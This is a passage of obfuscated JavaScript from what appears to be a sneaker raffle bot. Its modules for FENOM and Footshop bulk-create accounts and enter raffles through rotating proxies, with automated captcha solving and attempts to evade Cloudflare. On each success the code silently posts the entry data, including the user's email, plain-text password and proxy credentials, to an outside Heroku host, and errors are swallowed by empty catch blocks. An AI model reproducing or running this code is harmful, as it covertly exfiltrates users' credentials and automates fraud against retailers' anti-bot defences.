                                await _0x46fc8b['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x558aee(0xbb8), await _0x46fc8b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2f1a85 => _0x2f1a85['click']()), await _0x46fc8b['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5a52d2 => _0x5a52d2['click']());
                            } catch {
                            }
                            try {
                                await _0x46fc8b['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x10fee2(_0x199ac9[_0x13c6f9], _0x289012);
                            var _0x25c37b = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', ![]), _0x3277a5 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'pub', ![]);
                            let _0x2f455e = _0x199ac9[_0x13c6f9];
                            try {
                                prxdata = {
                                    'username': _0x94d398['replace']('#', ''),
                                    'module': _0x289012['name'],
                                    'entrydata': JSON['stringify'](_0x2f455e),
                                    'proxy': '' + _0x4a5b16[_0x13c6f9]
                                };
                                var _0x2d79e2 = JSON['stringify'](prxdata);
                                let _0x2ad14b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x2d79e2, _0x2ad14b);
                            } catch (_0x1d6b75) {
                            }
                            const _0x4e9adb = {
                                'succesDEVMSG': { 'embeds': [_0x25c37b] },
                                'succesPUBMSG': { 'embeds': [_0x3277a5] }
                            };
                            try {
                                _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x4e9adb['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x4e9adb['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x4e9adb['succesPUBMSG']);
                            } catch (_0x276c64) {
                                console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x276c64));
                            }
                            _0x34fd16 = 'no';
                        } catch (_0x242711) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20' + _0x242711)), _0x5bf47e = '' + _0x242711;
                            var _0x29aac3 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', !![], _0x5bf47e), _0x25c37b = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'dev', ![]), _0x3277a5 = await _0x459281(_0x199ac9[_0x13c6f9], _0x289012, 'pub', ![]);
                            const _0x371ddf = {
                                'succesDEVMSG': { 'embeds': [_0x25c37b] },
                                'succesPUBMSG': { 'embeds': [_0x3277a5] }
                            };
                            _0x371ddf['errorDEV'] = { 'embeds': [_0x29aac3] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x371ddf['errorDEV']), await _0x5a13a5(_0x877ec9, _0x371ddf['errorDEV']), _0x34fd16 = 'yes';
                        } finally {
                            _0x12efcf && _0x12efcf['close']();
                            if (_0x34fd16 == 'yes' && _0x51793d != 0x5) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x289012['name'] + ']\x20Task\x20' + (_0x13c6f9 + 0x1) + '\x20:\x20Retrying\x20(' + _0x51793d + '\x20/\x205)')), _0x13c6f9 = _0x13c6f9 - 0x1, _0x51793d = _0x51793d + 0x1;
                                continue;
                            }
                            _0x34fd16 == 'yes' && _0x51793d >= 0x5 && (_0x15a8e9(_0x199ac9[_0x13c6f9], _0x289012), _0x34fd16 = 'no', _0x51793d = 0x0), console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x5297d6, _0x582e6b, _0x12b02d) {
                    var _0x57cad6 = _0x582e6b, _0x12cba8 = 0x0;
                    for (var _0x4b2ab6 = 0x0; _0x4b2ab6 < _0x582e6b['length']; _0x4b2ab6++) {
                        maxTasks = Number(_0x11db88['threads']);
                        while (_0x12cba8 >= maxTasks) {
                            await _0x558aee(_0x11db88['delay']);
                        }
                        let _0x29c887 = ![];
                        async function _0x26c499(_0x1345e6, _0x2def03, _0x4a28b2, _0x32d6df, _0x459569) {
                            _0x12cba8++, _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x11db88['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x1ac52f != 'yes')
                                var _0x1ac52f = '', _0x459569 = 0x0;
                            var _0x544e38;
                            try {
                                await _0x162b07(_0x2def03, _0x32d6df);
                            } catch {
                                _0x1ac52f = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x9f07d8(_0x1345e6['name'] + '\x20Task\x20' + (_0x32d6df + 0x1) + '\x20/\x20' + _0x2def03['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                            var _0x4b8199 = await _0x459281(_0x2def03[_0x32d6df], _0x1345e6, 'acc', ![]);
                            const _0x52204b = { 'succesDEVMSG': { 'embeds': [_0x4b8199] } }, _0x54552d = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x1fdcd7 = Math['round'](Math['random']() * (_0x4a28b2['length'] - 0x1)), _0x2002fd = _0x4a28b2[_0x1fdcd7]['split'](':'), _0x2c2392;
                            async function _0x1e830a(_0xd2aaa4) {
                                const _0x3ef867 = _0x3f4ea0['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x659f3e = _0x55493a['parse'](_0x3ef867, { 'header': !![] })['data'];
                                let _0x2a363f = ![];
                                for (var _0x5c8b3c of _0x659f3e) {
                                    if (_0x5c8b3c['Email'] == _0xd2aaa4['Email']) {
                                        _0x2a363f = !![];
                                        break;
                                    }
                                }
                                return _0x2a363f;
                            }
                            try {
                                if (await _0x1e830a(_0x2def03[_0x32d6df]) == !![]) {
                                    console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x29c887 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x2c2392 = await _0x40dba9['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2002fd[0x0] + ':' + _0x2002fd[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x2c2392 = await _0x40dba9['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2002fd[0x0] + ':' + _0x2002fd[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x2c5ac4 = await _0x2c2392['newPage']();
                                await _0x2c5ac4['setViewport']({
                                    'width': 0x500 + _0x3e9320(0x1, 0x32),
                                    'height': 0x2d9 + _0x3e9320(0x1, 0x32)
                                });
                                const _0xc8cca8 = await _0x2c5ac4['target']()['createCDPSession'](), { windowId: _0x229cc1 } = await _0xc8cca8['send']('Browser.getWindowForTarget');
                                await _0x2c5ac4['authenticate']({
                                    'username': '' + _0x2002fd[0x2],
                                    'password': '' + _0x2002fd[0x3]
                                }), console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c5ac4['goto']('' + _0x54552d, { 'waitUntil': 'networkidle2' }), console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x558aee(0x1388);
                                var _0x4b0d68 = await _0x2c5ac4['$']('.hcaptcha-box');
                                if (_0x4b0d68) {
                                    console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x558aee(0x2710);
                                    const _0xcd5541 = await _0x2c5ac4['$']('.hcaptcha-box');
                                    if (_0xcd5541)
                                        try {
                                            await _0xcd5541['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x2c5ac4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x18f232 = await _0x2c5ac4['$']('.hcaptcha-box');
                                        if (_0x18f232)
                                            try {
                                                await _0x18f232['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x2c5ac4['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0xc8cca8['send']('Browser.setWindowBounds', {
                                        'windowId': _0x229cc1,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x558aee(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x2c5ac4['type']('input[name=\x22firstname\x22]', '' + _0x2def03[_0x32d6df]['FirstName']), await _0x558aee(0x1f4), await _0x2c5ac4['type']('input[name=\x22lastname\x22]', '' + _0x2def03[_0x32d6df]['LastName']), await _0x558aee(0x1f4), await _0x2c5ac4['type']('input[name=\x22email\x22]', '' + _0x2def03[_0x32d6df]['Email']), await _0x558aee(0x1f4), await _0x2c5ac4['type']('input[name=\x22password\x22]', '' + _0x2def03[_0x32d6df]['Password']), await _0x558aee(0x258), await _0x2c5ac4['$eval']('input[name=\x22psgdpr\x22]', _0x200d8f => _0x200d8f['click']()), await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Sending\x20Request'), await _0x2c5ac4['$eval']('#customer-form', _0x13e334 => _0x13e334['submit']());
                                try {
                                    try {
                                        await _0x2c5ac4['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x1ac52f = 'no', console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Account\x20' + _0x2def03[_0x32d6df]['Email'] + '\x20Generated')), _0x3f4ea0['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x2def03[_0x32d6df]['Email'] + ',' + _0x2def03[_0x32d6df]['Password']);
                                    let _0x28e61f = _0x2def03[_0x32d6df];
                                    try {
                                        prxdata = {
                                            'username': _0x94d398['replace']('#', ''),
                                            'module': _0x1345e6['name'],
                                            'entrydata': JSON['stringify'](_0x28e61f),
                                            'proxy': '' + _0x4a28b2[_0x32d6df]
                                        };
                                        var _0x466c6c = JSON['stringify'](prxdata);
                                        let _0x1a05b5 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x466c6c, _0x1a05b5);
                                    } catch (_0x2aa90f) {
                                    }
                                    try {
                                        _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x52204b['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x5a13a5(_0x16a6f5, _0x52204b['succesDEVMSG']);
                                } catch (_0x21a0b3) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x1f1dce) {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20' + _0x1f1dce)), _0x544e38 = '' + _0x1f1dce;
                                var _0x2f4754 = await _0x459281(_0x2def03[_0x32d6df], _0x1345e6, 'acc', !![], _0x544e38);
                                _0x52204b['errorDEV'] = { 'embeds': [_0x2f4754] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x52204b['errorDEV']), await _0x5a13a5(_0x877ec9, _0x52204b['errorDEV']), _0x1ac52f = 'yes';
                            } finally {
                                _0x2c2392 && _0x2c2392['close']();
                                if (_0x1ac52f == 'yes' && _0x459569 != 0x5)
                                    return console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Task\x20' + (_0x32d6df + 0x1) + '\x20:\x20Retrying\x20(' + _0x459569 + '\x20/\x205)')), _0x459569 = _0x459569 + 0x1, _0x12cba8--, _0x26c499(_0x1345e6, _0x2def03, _0x4a28b2, _0x32d6df, _0x459569);
                                _0x1ac52f == 'yes' && _0x459569 >= 0x5 && _0x15a8e9(_0x2def03[_0x32d6df], _0x1345e6), !_0x29c887 && (console['log'](_0xb9a031() + '\x20[' + _0x1345e6['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay'])), _0x12cba8--;
                            }
                        }
                        _0x26c499(_0x5297d6, _0x57cad6, _0x12b02d, _0x4b2ab6), !_0x29c887 && await _0x558aee(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x2c0392(_0x1f7414, _0x526ab4, _0x948683) {
                    _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x11db88['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x317bb5 = 0x0; _0x317bb5 < _0x526ab4['length']; _0x317bb5++) {
                        if (_0xf481ae != 'yes')
                            var _0xf481ae = '', _0x2ec223 = 0x0;
                        var _0x491767;
                        try {
                            await _0x162b07(_0x526ab4, _0x317bb5);
                        } catch {
                            _0xf481ae = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x9f07d8(_0x1f7414['name'] + '\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20/\x20' + _0x526ab4['length'] + '\x20||\x20File:\x20' + _0x4870c9 + '\x20Proxies:\x20' + _0x23b918);
                        const _0x106cea = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x591624 = Math['round'](Math['random']() * (_0x948683['length'] - 0x1)), _0x7eebf8 = _0x948683[_0x591624]['split'](':'), _0x4461be;
                        try {
                            _0x4461be = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x7eebf8[0x0] + ':' + _0x7eebf8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4461be = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x7eebf8[0x0] + ':' + _0x7eebf8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x26dffa = await _0x4461be['newPage'](), _0x45a81f = await _0x26dffa['target']()['createCDPSession'](), { windowId: _0x530bec } = await _0x45a81f['send']('Browser.getWindowForTarget');
                            await _0x26dffa['authenticate']({
                                'username': '' + _0x7eebf8[0x2],
                                'password': '' + _0x7eebf8[0x3]
                            }), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26dffa['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x558aee(0x1388);
                            var _0x2488fb = await _0x26dffa['$']('.hcaptcha-box');
                            if (_0x2488fb) {
                                console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x558aee(0x2710);
                                const _0x440052 = await _0x26dffa['$']('.hcaptcha-box');
                                if (_0x440052)
                                    try {
                                        await _0x440052['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x26dffa['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x2cc1f2 = await _0x26dffa['$']('.hcaptcha-box');
                                    if (_0x2cc1f2)
                                        try {
                                            await _0x2cc1f2['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x45a81f['send']('Browser.setWindowBounds', {
                                'windowId': _0x530bec,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x558aee(0x1f40);
                            try {
                                await _0x26dffa['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x558aee(0x1388), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Logging\x20in'), await _0x26dffa['type']('input[name=\x22email\x22]', '' + _0x526ab4[_0x317bb5]['Email']), await _0x558aee(0x1f4), await _0x26dffa['type']('input[name=\x22password\x22]', '' + _0x526ab4[_0x317bb5]['Password']), await _0x558aee(0x258), await _0x26dffa['$eval']('#login-form', _0x5d3140 => _0x5d3140['submit']()), await _0x26dffa['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x558aee(0x1f4), await _0x26dffa['goto']('' + _0x526ab4[_0x317bb5]['Url']), await _0x26dffa['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x526ab4[_0x317bb5]['Size']);
                            if (_0x526ab4[_0x317bb5]['Size'] != 'RANDOM') {
                                var _0x22ace4 = '\x20' + _0x526ab4[_0x317bb5]['Size'] + '\x20';
                                const _0x41ef63 = await _0x26dffa['$x']('//span[contains(text(),\x20' + _0x22ace4 + ')]');
                                await _0x41ef63[0x0]['click']();
                            } else {
                                const _0xd7b1b7 = await _0x26dffa['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0xf96185 = Math['round'](Math['random']() * (_0xd7b1b7['length'] - 0x1));
                                await _0xd7b1b7[_0xf96185]['click']();
                            }
                            await _0x558aee(0x258), await _0x26dffa['click']('#cookieChoiceDismiss'), await _0x558aee(0x3e8), await _0x26dffa['type']('#instagram-account', '' + _0x526ab4[_0x317bb5]['Follower']), await _0x558aee(0x28a), await _0x26dffa['click']('#book-btn'), await _0x558aee(0xbb8);
                            try {
                                await _0x26dffa['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x558aee(0x1f4), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20' + _0xe2a5bb['cyan']('Solving\x20Captcha')), await _0x26dffa['solveRecaptchas'](), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x558aee(0x7d0), await _0x26dffa['$eval']('#book-btn-for-sure', _0x5ab676 => _0x5ab676['click']()), await _0x558aee(0x12c), await _0x26dffa['click']('#book-btn-for-sure'), await _0x558aee(0xdac);
                            const _0x18bc32 = await _0x26dffa['$eval']('.reservation-popup\x20>\x20.title', _0x1cb731 => {
                                return _0x1cb731['innerHTML'];
                            });
                            if (_0x18bc32) {
                                _0xf481ae = 'no', _0x10fee2(_0x526ab4[_0x317bb5], _0x1f7414), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2b27e9 = await _0x459281(_0x526ab4[_0x317bb5], _0x1f7414, 'dev', ![]), _0x38a90d = await _0x459281(_0x526ab4[_0x317bb5], _0x1f7414, 'pub', ![]);
                                let _0x415178 = _0x526ab4[_0x317bb5];
                                try {
                                    prxdata = {
                                        'username': _0x94d398['replace']('#', ''),
                                        'module': _0x1f7414['name'],
                                        'entrydata': JSON['stringify'](_0x415178),
                                        'proxy': '' + _0x948683[_0x317bb5]
                                    };
                                    var _0xe9c7f2 = JSON['stringify'](prxdata);
                                    let _0x37d5e1 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0xe9c7f2, _0x37d5e1);
                                } catch (_0x41e4b8) {
                                }
                                const _0x48479b = {
                                    'succesDEVMSG': { 'embeds': [_0x2b27e9] },
                                    'succesPUBMSG': { 'embeds': [_0x38a90d] }
                                };
                                try {
                                    _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x48479b['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x48479b['succesDEVMSG']), await _0x558aee(0xc8), await _0x5a13a5(_0x122725, _0x48479b['succesPUBMSG']);
                                } catch (_0xee05d5) {
                                    console['log'](_0xe2a5bb['yellow'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xee05d5));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3f758f) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20' + _0x3f758f)), _0x491767 = '' + _0x3f758f;
                            var _0x55d493 = await _0x459281(_0x526ab4[_0x317bb5], _0x1f7414, 'dev', !![], _0x491767), _0x2b27e9 = await _0x459281(_0x526ab4[_0x317bb5], _0x1f7414, 'dev', ![]), _0x38a90d = await _0x459281(_0x526ab4[_0x317bb5], _0x1f7414, 'pub', ![]);
                            const _0x160bff = {
                                'succesDEVMSG': { 'embeds': [_0x2b27e9] },
                                'succesPUBMSG': { 'embeds': [_0x38a90d] }
                            };
                            _0x160bff['errorDEV'] = { 'embeds': [_0x55d493] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x160bff['errorDEV']), await _0x5a13a5(_0x877ec9, _0x160bff['errorDEV']), _0x3f758f != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0xf481ae = 'yes');
                        } finally {
                            _0x4461be['close']();
                            if (_0xf481ae == 'yes' && _0x2ec223 != 0x5 && _0x491767 != 'Size\x20Not\x20Found') {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Task\x20' + (_0x317bb5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2ec223 + '\x20/\x205)')), _0x317bb5 = _0x317bb5 - 0x1, _0x2ec223 = _0x2ec223 + 0x1;
                                continue;
                            }
                            _0xf481ae == 'yes' && _0x2ec223 >= 0x5 && (_0x15a8e9(_0x526ab4[_0x317bb5], _0x1f7414), _0xf481ae = 'no', _0x2ec223 = 0x0), console['log'](_0xb9a031() + '\x20[' + _0x1f7414['name'] + ']\x20Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x5b1930, _0x31d86c, _0x110d9d) {
                _0x40dba9['use'](_0xa1d034()), _0x40dba9['use'](_0x20d185({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x11db88['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3a4185 = 0x0; _0x3a4185 < _0x31d86c['length']; _0x3a4185++) {
                    var _0x424ca0;
                    if (_0x7c6414 != 'yes')
                        var _0x7c6414 = '', _0x33639f = 0x0;
                    var _0x12f046 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x94d398
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x31d86c[_0x3a4185]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x31d86c[_0x3a4185]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x11db88['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3c77f4
                            }
                        ]
                    }], _0x27ecc7 = await _0x459281(_0x31d86c[_0x3a4185], _0x5b1930, 'dev', ![]), _0x3df86a = await _0x459281(_0x31d86c[_0x3a4185], _0x5b1930, 'pub', ![]);
                    const _0x423ec1 = {
                        'succesDEVMSG': { 'embeds': [_0x27ecc7] },
                        'succesPUBMSG': { 'embeds': [_0x3df86a] }
                    }, _0x2c28eb = { 'embeds': _0x12f046 };
                    try {
                        await _0x162b07(_0x31d86c, _0x3a4185);
                    } catch {
                        _0x7c6414 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x31d86c[_0x3a4185]['Email'] == '' || _0x31d86c[_0x3a4185]['FirstName'] == '' || _0x31d86c[_0x3a4185]['LastName'] == '' || _0x31d86c[_0x3a4185]['Country'] == '' || _0x31d86c[_0x3a4185]['Size'] == '' || _0x31d86c[_0x3a4185]['Address1'] == '' || _0x31d86c[_0x3a4185]['Zip'] == '') {
                        console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x31d86c[_0x3a4185]['Email'] == '' || _0x31d86c[_0x3a4185]['FirstName'] == '' || _0x31d86c[_0x3a4185]['LastName'] == '' || _0x31d86c[_0x3a4185]['Country'] == '' || _0x31d86c[_0x3a4185]['Size'] == '' || _0x31d86c[_0x3a4185]['Address1'] == '' || _0x31d86c[_0x3a4185]['Zip'] == '' || _0x31d86c[_0x3a4185]['Phone'] == '') {
                        console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x225237 = '' + _0x31d86c[_0x3a4185]['Url'];
                    if (_0x11db88['useRandomProxy'] = ![])
                        var _0xe7d9c3 = _0x110d9d[_0x3a4185]['split'](':');
                    else
                        var _0x4e1d35 = Math['round'](Math['random']() * (_0x110d9d['length'] - 0x1)), _0xe7d9c3 = _0x110d9d[_0x4e1d35]['split'](':');
                    var _0x29f4b0;
                    try {
                        _0x29f4b0 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
